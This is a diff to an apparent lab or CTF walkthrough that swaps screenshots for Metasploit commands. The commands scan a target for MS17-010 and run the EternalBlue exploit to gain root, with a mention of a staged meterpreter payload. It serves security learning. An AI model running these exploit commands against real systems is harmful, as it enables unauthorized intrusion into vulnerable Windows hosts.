@@ -21,13 +21,27 @@ nmap -T4 -p- -A <IP>
 
 This means it was a possibility to be vulnerable to eternal blue 0 smb\_ms17\_010
 
-<figure><img src="../.gitbook/assets/f8ec6f4c146aff7726d11101bc75726ab81e82d121aabb5f59d6c083daba624a (1).png" alt=""><figcaption></figcaption></figure>
+```bash
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS $IP
+run
+```
 
-<figure><img src="../.gitbook/assets/5633616314c88329ec0a26e11bae90b103ce04019bc2a9ce228cc7776b606890.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+* Run eternal blue explit to root the machine
+
+```bash
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS $IP
+run
+```
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 Can try to change the payload to meterpetrer with staged payload
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Manual way
 
